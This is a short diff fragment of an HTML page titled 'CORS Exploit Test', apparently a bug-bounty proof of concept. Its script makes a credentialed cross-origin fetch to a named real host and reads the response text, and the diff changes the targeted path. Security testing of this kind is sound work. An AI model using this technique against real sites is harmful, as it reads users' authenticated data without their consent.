@@ -3,7 +3,7 @@
   <body>
     <h1>CORS Exploit Test</h1>
     <script>
-      fetch("https://intigriti.ilias-solutions.com/intigriti/custreq/rest/dl", {
+      fetch("https://intigriti.ilias-solutions.com/intigriti/custreq/#/crireq?appId=CUSTREQ", {
         credentials: "include"
       })
       .then(response => response.text())
